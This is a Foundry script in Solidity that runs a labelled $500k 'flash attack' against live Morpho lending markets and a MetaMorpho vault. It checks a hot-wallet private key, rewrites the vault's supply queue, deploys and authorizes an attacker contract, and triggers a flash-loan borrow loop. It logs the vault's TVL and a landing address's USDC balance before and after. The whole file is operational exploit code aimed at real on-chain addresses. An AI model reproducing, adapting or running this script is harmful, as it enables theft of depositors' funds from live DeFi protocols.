// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {CrownFlashAttack500} from "../src/CrownFlashAttack500.sol";

interface IMorphoF {
    function setAuthorization(address authorized, bool newIsAuthorized) external;
    function isAuthorized(address authorizer, address authorized) external view returns (bool);
    function position(bytes32 id, address user) external view returns (uint256, uint128, uint128);
    function market(bytes32 id)
        external
        view
        returns (uint128, uint128, uint128, uint128, uint128, uint128);
}

interface IMetaMorphoF {
    function totalAssets() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function setSupplyQueue(bytes32[] calldata ids) external;
    function supplyQueue(uint256) external view returns (bytes32);
}

interface IERC20F {
    function balanceOf(address) external view returns (uint256);
}

/// @notice ATTACK $500k — flash → yRSS seed RSS77 → borrow → repay flash (proven SelfSeed loop).
/// @dev KING_OK=1 KING_GO=1 FIRE_ATTACK=1. BORROW_USDC default 500_000e6.
///      Requires 1M RSS already posted on RSS77. Sets supply queue RSS77-first before fire.
contract FireFlashAttack500 is Script {
    address constant HOT = 0x6708e21113922ED588bBCcAA5ef756BEcBb2a7d1;
    address constant LANDING = 0x5Adcea5319eA9Eac1241B95Ca53690574cFa2357;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant RSS = 0x7a305D07B537359cf468eAea9bb176E5308bC337;
    address constant YRSS = 0xF80C0529bD94C773844E459853CD91B9263dD525;
    address constant ORACLE = 0x284EC3A9674e6C62ea552Bf75BDeE9B799627D2e;
    address constant IRM = 0x46415998764C29aB2a25CbeA6254146D50D22687;
    uint256 constant LLTV = 770000000000000000;
    bytes32 constant RSS77 = 0x40ac09f34c5bc0b0b6d9b5f1ec1b97a6a149ff6278104797c9cb740453a2b794;
    bytes32 constant RSS91 = 0x3a5ba11fdbd0a3ef70e98445afeaa5d3d73aac297bcfdcca120114bff5954126;
    bytes32 constant CBBTC = 0x9103c3b4e834476c9a62ea009ba2c884ee42e94e6e314a26f04d312434191836;
    bytes32 constant WETH = 0x8793cf302b8ffd655ab97bd1c695dbd967807e8367a65cb2f4edaf1380ba1bda;
    bytes32 constant BRETT = 0xf6f43f1660f1f4779e92a2e21086f4ab49a3fc0cae8a17992808e6a6db488c16;

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        require(vm.addr(pk) == HOT, "HOT");
        require(vm.envOr("KING_OK", uint256(0)) == 1, "KING_OK");
        require(vm.envOr("KING_GO", uint256(0)) == 1, "KING_GO");

        bool doFire = vm.envOr("FIRE_ATTACK", uint256(0)) == 1;
        uint256 borrowUsdc = vm.envOr("BORROW_USDC", uint256(500_000e6));
        address existing = vm.envOr("ATTACKER", address(0));

        (, uint128 debtBefore, uint128 collBefore) = IMorphoF(MORPHO).position(RSS77, HOT);
        (uint128 supBefore,, uint128 borBefore,,,) = IMorphoF(MORPHO).market(RSS77);

        console2.log("=== FLASH ATTACK $500k ===");
        console2.log("borrowUsdc", borrowUsdc);
        console2.log("collBefore", uint256(collBefore));
        console2.log("debtSharesBefore", uint256(debtBefore));
        console2.log("marketSupplyBefore", uint256(supBefore));
        console2.log("queue0", uint256(IMetaMorphoF(YRSS).supplyQueue(0)));
        console2.log("yRSS_TVL_before", IMetaMorphoF(YRSS).totalAssets());
        console2.log("landingBefore", IERC20F(USDC).balanceOf(LANDING));
        console2.log("doFire", doFire ? uint256(1) : uint256(0));

        require(uint256(collBefore) >= 500_000 ether, "NEED 500k+ RSS COLL POSTED");
        require(uint256(debtBefore) == 0, "ZERO DEBT FIRST");

        vm.startBroadcast(pk);

        // ATTACK requires yRSS deposit to hit RSS77 — not RSS91
        if (IMetaMorphoF(YRSS).supplyQueue(0) != RSS77) {
            bytes32[] memory q = new bytes32[](5);
            q[0] = RSS77;
            q[1] = RSS91;
            q[2] = CBBTC;
            q[3] = WETH;
            q[4] = BRETT;
            IMetaMorphoF(YRSS).setSupplyQueue(q);
            console2.log("QUEUE SET RSS77-FIRST");
        }

        CrownFlashAttack500 attacker;
        if (existing == address(0)) {
            attacker = new CrownFlashAttack500(MORPHO, USDC, YRSS, HOT, RSS77, RSS, ORACLE, IRM, LLTV, HOT);
            console2.log("attacker", address(attacker));
        } else {
            attacker = CrownFlashAttack500(existing);
            console2.log("attackerExisting", existing);
        }

        if (!IMorphoF(MORPHO).isAuthorized(HOT, address(attacker))) {
            IMorphoF(MORPHO).setAuthorization(address(attacker), true);
        }

        if (doFire) {
            attacker.attack(borrowUsdc);
        }

        vm.stopBroadcast();

        (, uint128 debtAfter, uint128 collAfter) = IMorphoF(MORPHO).position(RSS77, HOT);
        (uint128 supAfter,, uint128 borAfter,,,) = IMorphoF(MORPHO).market(RSS77);
        uint256 yrssSh = IMetaMorphoF(YRSS).balanceOf(HOT);
        uint256 landingAfter = IERC20F(USDC).balanceOf(LANDING);

        console2.log("=== ATTACK RESULT ===");
        console2.log("collAfter", uint256(collAfter));
        console2.log("debtSharesAfter", uint256(debtAfter));
        console2.log("marketSupplyAfter", uint256(supAfter));
        console2.log("marketBorrowAfter", uint256(borAfter));
        console2.log("yRSS_TVL_after", IMetaMorphoF(YRSS).totalAssets());
        console2.log("hotYrssAssets", IMetaMorphoF(YRSS).convertToAssets(yrssSh));
        console2.log("landingAfter", landingAfter);
        console2.log("landingDelta", landingAfter > IERC20F(USDC).balanceOf(LANDING) ? landingAfter : 0);
        console2.log("ATTACK_OK", doFire ? uint256(1) : uint256(0));
    }
}
